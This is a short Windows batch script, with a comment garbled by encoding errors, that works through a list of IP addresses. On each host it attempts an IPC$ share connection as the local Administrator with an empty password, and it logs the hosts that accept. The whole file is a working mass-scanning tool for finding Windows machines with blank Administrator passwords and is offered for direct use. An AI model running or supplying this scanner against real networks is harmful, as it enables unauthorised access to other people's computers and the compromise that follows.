@echo off
::IPC¿ÕÁ´½ÓÅúÁ¿±¬ÆÆ
cls
echo Useage: %0 ip.txt
echo [+]Scanning...
for /f %%t in (%1) do (
echo net use \\%%t\ipc$ "" /user:"localhost\Administrator" >> log.txt
net use \\%%t\ipc$ "" /user:"localhost\Administrator"  >NUL 2>NUL
IF NOT errorlevel 1 (
echo success:%%t>> connected.txt
net use \\%%t\ipc$ /del
)
net use * /del /y >NUL 2>NUL
)
echo [+]Scan has ended.